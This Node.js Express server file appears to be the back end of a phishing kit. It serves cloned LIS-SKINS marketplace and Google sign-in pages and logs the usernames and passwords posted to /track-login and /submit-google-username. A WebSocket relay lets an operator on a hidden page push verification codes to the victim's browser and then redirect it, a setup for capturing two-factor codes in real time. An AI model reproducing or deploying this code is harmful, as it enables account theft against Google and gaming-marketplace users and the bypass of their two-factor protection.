const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;
const bodyParser = require("body-parser");
const cors = require("cors");
const WebSocket = require('ws');

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.urlencoded({ extended: true }));

// Зберігаємо дані
let sharedData = {
  number: null,
  isSuccess: false,
  clients: [] // Для Server-Sent Events
};

// Create HTTP server
const server = app.listen(PORT, () => {
  console.log(`Сервер запущений на порту ${PORT}`);
  console.log(`Відкрийте http://localhost:${PORT} у браузері`);
});

// WebSocket Server
const wss = new WebSocket.Server({ server });

// Track active connections
let pageAConnection = null;
let pageBConnection = null;

wss.on('connection', (ws) => {
  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      
      // Register Page A connection
      if (data.type === 'register_pageA') {
        pageAConnection = ws;
        console.log('Page A connected');
      }
      
      // Register Page B connection
      if (data.type === 'register_pageB') {
        pageBConnection = ws;
        console.log('Page B connected');
      }
      
      // Forward code from Page B to Page A
      if (data.type === 'send_code' && pageAConnection) {
        console.log('Received code from Page B:', data.code);
        pageAConnection.send(JSON.stringify({
          type: 'show_code',
          code: data.code
        }));
      }
      
      // Forward verification confirmation from Page B to Page A
      if (data.type === 'confirm_verification' && pageAConnection) {
        console.log('Verification confirmed by Page B');
        pageAConnection.send(JSON.stringify({
          type: 'redirect'
        }));
      }
    } catch (e) {
      console.error('Error processing message:', e);
    }
  });

  ws.on('close', () => {
    if (ws === pageAConnection) {
      pageAConnection = null;
      console.log('Page A disconnected');
    }
    if (ws === pageBConnection) {
      pageBConnection = null;
      console.log('Page B disconnected');
    }
  });
});

// Статичні файли (existing code remains unchanged)
app.use("/main", express.static(path.join(__dirname, 'main')));
app.use("/login", express.static(path.join(__dirname, "login")));
app.use("/verification-code", express.static(path.join(__dirname, "verification-code")));
app.use("/login-google", express.static(path.join(__dirname, "login-google")));
app.use("/KJFHUSDFHIOUSDFHJIO", express.static(path.join(__dirname, "KJFHUSDFHIOUSDFHJIO")));

// Маршрути (existing code remains unchanged)
app.get('/main', (req, res) => {
  res.sendFile(path.join(__dirname, 'main', 'Продать скины КС2, КС ГО и Дота 2 за реальные деньги на LIS-SKINS.html'));
});

app.get('/login-google', (req, res) => {
  res.sendFile(path.join(__dirname, 'login-google', 'Вхід – облікові записи Google.html'));
});

app.get('/verification-code', (req, res) => {
  res.sendFile(path.join(__dirname, 'verification-code', 'index.html'));
});

app.get('/KJFHUSDFHIOUSDFHJIO', (req, res) => {
  res.sendFile(path.join(__dirname, 'KJFHUSDFHIOUSDFHJIO', 'index.html'));
});

app.post('/submit-google-username', (req, res) => {
  console.log('Отримані дані:', req.body);
  res.json({ 
    success: true,
    message: 'Дані успішно отримані',
    receivedData: req.body
  });
});

app.post("/track-login", (req, res) => {
  const { login, password } = req.body;
  console.log("Success!");
  console.log("Login:", login);
  console.log("Password:", password);
  res.json({ message: "Дані отримані успішно!" });
});

app.get("/login/", (req, res) => {
  console.log("LOGIN");
  res.sendFile(path.join(__dirname, "login", "Увійти.html"));
});